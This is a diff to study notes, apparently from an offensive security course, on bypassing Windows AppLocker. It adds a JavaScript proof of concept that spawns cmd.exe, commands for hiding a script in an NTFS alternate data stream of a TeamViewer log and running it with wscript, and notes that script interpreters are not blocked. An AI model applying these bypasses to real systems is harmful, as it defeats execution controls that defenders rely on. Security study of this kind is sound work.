@@ -3,6 +3,8 @@
 Bypasses:
 1) [Trusted Folders](#trusted-folders)
 2) [Bypass with DLLs](#bypass-with-dlls)
+3) [Alternate Data Streams](#alternate-data-streams)
+4) [Third Party Executables](#third-party)
 
 
 #### Brief backbround 
@@ -38,7 +40,7 @@ Ex: icacls.exe C:\Windows\Tasks
 <br><br>
 
 ## Bypass with DLL's
-<a name="bypass-with-dlls")></a>
+<a name="bypass-with-dlls"></a>
 
 **The default ruleset doesn't protect against loading arbitrary DLLs.**
 
@@ -46,7 +48,35 @@ Ex: icacls.exe C:\Windows\Tasks
 
 **When enabled, default rules allow execution in C:\Windows\* AND C:\Program Files** this does not include C:\program files(x86)
 
+<br><br>
+
+## 12.2.3. Alternate Data Streams  
+<a name="alternate-data-streams"></a>  
+
+#### POC running .js file via wscript via ADS
+
+**POC SCRIPT saved as test.js**
+``` Javascript
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+```
+<br><br>
+<img width="785" height="250" alt="image" src="https://github.com/user-attachments/assets/a0c5021f-a6d8-478b-aeb4-978db4d802b9" />
+<br><br>
 
 
+To view AD streams, use /r for recursive: **dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"**
+<br><br>
 
+To execute ADS: **wscript "C:\program files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.ks"**
+<br><br>
+
+<img width="866" height="253" alt="image" src="https://github.com/user-attachments/assets/1a06ac38-21e3-4828-92d4-a1cca632c340" />
+
+
+## 12.2.4 Third Party Execution
+<a name="third-party"></a>
+
+**Third party frameworks like Python,Perl, Java and Microsoft Office VBA are NOT blocked by AppLocker**
+<br><br><br>
 
